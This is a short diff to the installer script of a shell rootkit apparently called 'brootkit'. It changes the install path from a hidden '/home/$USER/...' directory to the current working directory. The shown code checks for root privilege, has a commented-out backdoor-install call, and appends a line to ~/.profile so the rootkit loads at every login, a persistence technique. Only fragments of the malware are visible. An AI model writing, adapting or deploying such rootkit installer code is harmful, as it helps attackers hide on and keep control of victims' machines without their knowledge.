@@ -1,6 +1,6 @@
 #!/bin/sh
 
-BR_ROOTKIT_PATH="/home/$USER/..."
+BR_ROOTKIT_PATH="$(pwd)/"
 br_privilege=1
 
 br_hookhup()
@@ -38,7 +38,7 @@ br_check_privilege()
 br_set_rootkit_path()
 {
 	if [ $br_privilege -eq 1 ]; then
-		BR_ROOTKIT_PATH="/home/$USER/..."
+		BR_ROOTKIT_PATH="$(pwd)/"
 	else
 		echo "install brootkit using root privilege."
 	fi
@@ -87,7 +87,7 @@ main()
 	br_creat_home
 	#br_install_backdoor
 
-	echo ". /home/$USER/..." >> ~/.profile
+	echo ". $(pwd)/" >> ~/.profile
 
         if [ $? -eq 1 ]; then
                 echo "install brootkit failed."
